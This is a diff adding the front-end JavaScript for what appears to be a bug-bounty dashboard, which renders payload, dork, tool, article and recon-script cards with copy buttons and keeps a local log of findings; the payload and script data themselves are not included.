+// ── PAYLOADS RENDER ──────────────────────────
+var pType = 'all';
+var P_LABELS = {xss:'XSS PAYLOADS',sqli:'SQL / NoSQL INJECTION',ssrf:'SSRF PAYLOADS','2fa':'2FA BYPASS BODIES',header:'HTTP HEADERS'};
+
+function renderPayloads() {
+  var items = pType === 'all' ? PAYLOADS : PAYLOADS.filter(function(p){return p.t===pType;});
+  var g = {};
+  items.forEach(function(p){if(!g[p.t])g[p.t]=[];g[p.t].push(p);});
+  var out = document.getElementById('pOut');
+  out.innerHTML = '';
+
+  Object.keys(g).forEach(function(type) {
+    var card = div('card');
+    card.style.marginBottom = '10px';
+    var title = div('ctitle', '▸ '+(P_LABELS[type]||type.toUpperCase()));
+    card.appendChild(title);
+
+    g[type].forEach(function(p) {
+      var row = div('pi');
+      var lbl = span('pil', p.l);
+      var val = span('piv', p.v); // textContent only — safe
+      var btn = el('button', 'cpbtn', '⎘');
+      btn.title = 'Copy';
+      (function(payload){
+        btn.onclick = function() {
+          navigator.clipboard.writeText(payload).then(function(){
+            btn.textContent = '✓';
+            btn.style.color = '#00ff9d';
+            setTimeout(function(){btn.textContent='⎘';btn.style.color='';}, 1200);
+          });
+        };
+      })(p.v);
+      row.appendChild(lbl);
+      row.appendChild(val);
+      row.appendChild(btn);
+      card.appendChild(row);
+    });
+    out.appendChild(card);
+  });
+}
+
+document.querySelectorAll('#pChips .chip').forEach(function(c) {
+  c.addEventListener('click', function() {
+    document.querySelectorAll('#pChips .chip').forEach(function(x){x.classList.remove('on');});
+    c.classList.add('on');
+    pType = c.dataset.p;
+    renderPayloads();
+  });
+});
+
+// ── REPORTS ──────────────────────────────────
+function addReport() {
+  var title = document.getElementById('rTitle').value.trim();
+  if (!title) { return; }
+  var r = {
+    id: Date.now(),
+    title: title,
+    sev: document.getElementById('rSev').value,
+    target: document.getElementById('rTarget').value,
+    cvss: document.getElementById('rCvss').value,
+    cwe: document.getElementById('rCwe').value,
+    desc: document.getElementById('rDesc').value,
+    status: document.getElementById('rStatus').value,
+    program: document.getElementById('rProgram').value,
+    date: new Date().toISOString().split('T')[0]
+  };
+  ST.reports.unshift(r);
+  save('reports', ST.reports);
+  ['rTitle','rTarget','rCvss','rCwe','rDesc','rProgram'].forEach(function(id){document.getElementById(id).value='';});
+  renderReports();
+  updateStats();
+}
+
+function deleteReport(id) {
+  ST.reports = ST.reports.filter(function(r){return r.id!==id;});
+  save('reports', ST.reports);
+  renderReports();
+  updateStats();
+}
+
+var ST_CLS = {accepted:'bg',submitted:'bl',triaged:'bm',duplicate:'bc',invalid:'bc',draft:'bi'};
+
+function renderReports() {
+  var out = document.getElementById('rOut');
+  out.innerHTML = '';
+  if (!ST.reports.length) {
+    var msg = div('card t3 fm ts2');
+    msg.style.cssText = 'text-align:center;padding:24px;color:#4a5568;font-family:"Courier New",monospace';
+    msg.textContent = 'No findings logged yet.';
+    out.appendChild(msg);
+    return;
+  }
+  var wrap = div('card');
+  wrap.style.padding = '0';
+  wrap.style.overflow = 'hidden';
+
+  ST.reports.forEach(function(r) {
+    var row = div('rrow');
+    var date = div('rdate', r.date);
+    var info = div('');
+    info.style.flex = '1';
+    var rtitle = div('rtitle', r.title);
+    var rsub = div('rsub', [r.target, r.program].filter(Boolean).join(' · '));
+    info.appendChild(rtitle);
+    info.appendChild(rsub);
+    if (r.desc) {
+      var rd = div('rsub', r.desc.length>100?r.desc.slice(0,100)+'…':r.desc);
+      info.appendChild(rd);
+    }
+    var badges = div('');
+    badges.style.cssText = 'display:flex;gap:4px;flex-wrap:wrap;align-items:center';
+    badges.appendChild(span('b '+(SEV_CLS[r.sev]||'bi'), r.sev.toUpperCase()));
+    badges.appendChild(span('b '+(ST_CLS[r.status]||'bi'), r.status.toUpperCase()));
+    if (r.cvss) badges.appendChild(span('b bm', 'CVSS '+r.cvss));
+    if (r.cwe) badges.appendChild(span('b bi', r.cwe));
+    var delbtn = el('button','btn btnsm btnd','DEL');
+    (function(rid){delbtn.onclick=function(){deleteReport(rid);};})(r.id);
+    row.appendChild(date);
+    row.appendChild(info);
+    row.appendChild(badges);
+    row.appendChild(delbtn);
+    wrap.appendChild(row);
+  });
+  out.appendChild(wrap);
+}
+
+// ── DORKS ────────────────────────────────────
+var dCat = 'all';
+var D_LABELS = {github:'GITHUB DORKS',google:'GOOGLE DORKS',shodan:'SHODAN DORKS',fofa:'FOFA DORKS',postman:'POSTMAN / API DORKS'};
+
+function renderDorks() {
+  var items = dCat === 'all' ? DORKS : DORKS.filter(function(d){return d.c===dCat;});
+  var g = {};
+  items.forEach(function(d){if(!g[d.c])g[d.c]=[];g[d.c].push(d);});
+  var out = document.getElementById('dOut');
+  out.innerHTML = '';
+
+  Object.keys(g).forEach(function(cat) {
+    var card = div('card');
+    card.style.marginBottom = '10px';
+    card.appendChild(div('ctitle', '▸ '+(D_LABELS[cat]||cat.toUpperCase())));
+    g[cat].forEach(function(d) {
+      var row = div('di');
+      row.title = 'Click to copy';
+      var lbl = span('dil', d.l);
+      var val = span('div2', d.v);
+      row.appendChild(lbl);
+      row.appendChild(val);
+      (function(dork){
+        row.onclick = function() {
+          navigator.clipboard.writeText(dork).then(function(){
+            row.style.borderColor = '#00ff9d';
+            setTimeout(function(){row.style.borderColor='';}, 900);
+          });
+        };
+      })(d.v);
+      card.appendChild(row);
+    });
+    out.appendChild(card);
+  });
+}
+
+document.querySelectorAll('#dChips .chip').forEach(function(c) {
+  c.addEventListener('click', function() {
+    document.querySelectorAll('#dChips .chip').forEach(function(x){x.classList.remove('on');});
+    c.classList.add('on');
+    dCat = c.dataset.d;
+    renderDorks();
+  });
+});
+
+// ── TOOLS ────────────────────────────────────
+function renderTools() {
+  var out = document.getElementById('tOut');
+  out.innerHTML = '';
+  TOOLS.forEach(function(tool) {
+    var row = div('ti');
+    var icon = div('tiicon', tool.icon);
+    var info = div('');
+    info.style.flex = '1';
+    info.appendChild(div('tiname', tool.n));
+    info.appendChild(div('tidesc', tool.d));
+    var code = div('ticode', tool.usage);
+    info.appendChild(code);
+    var btn = el('button','btn btnsm','COPY INSTALL');
+    btn.style.flexShrink = '0';
+    (function(install){
+      btn.onclick = function() {
+        navigator.clipboard.writeText(install).then(function(){
+          btn.textContent = 'COPIED ✓';
+          setTimeout(function(){btn.textContent='COPY INSTALL';}, 1200);
+        });
+      };
+    })(tool.install);
+    row.appendChild(icon);
+    row.appendChild(info);
+    row.appendChild(btn);
+    out.appendChild(row);
+  });
+}
+
+// ── ARTICLES ─────────────────────────────────
+var aCat = 'all';
+
+function renderArticles() {
+  var items = aCat === 'all' ? ARTICLES : ARTICLES.filter(function(a){return a.c===aCat;});
+  var out = document.getElementById('aOut');
+  out.innerHTML = '';
+  items.forEach(function(a) {
+    var card = div('ac');
+    card.appendChild(span('actag', a.c.toUpperCase()));
+    card.appendChild(div('actitle', a.title));
+    card.appendChild(div('acdesc', a.desc));
+    card.appendChild(div('acmeta', a.meta));
+    out.appendChild(card);
+  });
+}
+
+document.querySelectorAll('#aChips .chip').forEach(function(c) {
+  c.addEventListener('click', function() {
+    document.querySelectorAll('#aChips .chip').forEach(function(x){x.classList.remove('on');});
+    c.classList.add('on');
+    aCat = c.dataset.a;
+    renderArticles();
+  });
+});
+
+// ── RECON SCRIPTS ────────────────────────────
+function renderRecon() {
+  var out = document.getElementById('rcOut');
+  out.innerHTML = '';
+  RECON_SCRIPTS.forEach(function(r) {
+    var wrap = div('rs');
+    var head = div('');
+    head.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
+    head.appendChild(div('rstitle', r.title));
+    var btn = el('button','btn btnsm','COPY');
+    (function(code){
+      btn.onclick = function(){
+        navigator.clipboard.writeText(code).then(function(){
+          btn.textContent = 'COPIED ✓';
+          setTimeout(function(){btn.textContent='COPY';}, 1200);
+        });
+      };
+    })(r.code);
+    head.appendChild(btn);
+    wrap.appendChild(head);
+    wrap.appendChild(div('rsdesc', r.desc));
+
+    var term = div('term');
+    term.innerHTML = '<div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tlbl">bash</span></div>';
+    var tbody = div('tbody tout');
+    tbody.style.cssText = 'white-space:pre;overflow-x:auto;font-size:11px';
+    tbody.textContent = r.code;
+    term.appendChild(tbody);
+    wrap.appendChild(term);
+    out.appendChild(wrap);
+  });
+}
+
+// ── TARGET & STATS ───────────────────────────
+function setTarget() {
+  var v = document.getElementById('targetIn').value.trim();
+  ST.target = v;
+  save('target', v);
+  var el2 = document.getElementById('dTarget');
+  if (el2) el2.textContent = v || 'not set';
+}
+
+function updateStats() {
+  var done = Object.values(ST.checks).filter(Boolean).length;
+  var total = CL.length;
+  var pct = total ? Math.round(done/total*100) : 0;
+  document.getElementById('sChecks').textContent = done;
+  document.getElementById('sReports').textContent = ST.reports.length;
+  document.getElementById('sProg').textContent = pct+'%';
+  var dp = document.getElementById('dProg');
+  if (dp) dp.textContent = done+'/'+total+' ('+pct+'% complete)';
+}
+
+// ── INIT ─────────────────────────────────────
+if (ST.target) {
+  document.getElementById('targetIn').value = ST.target;
+  document.getElementById('dTarget').textContent = ST.target;
+}
+renderCL();
+renderVulns();
+renderPayloads();
+renderReports();
+renderDorks();
+renderTools();
+renderArticles();
+renderRecon();
+updateStats();
+</script>
+</body>
+</html>
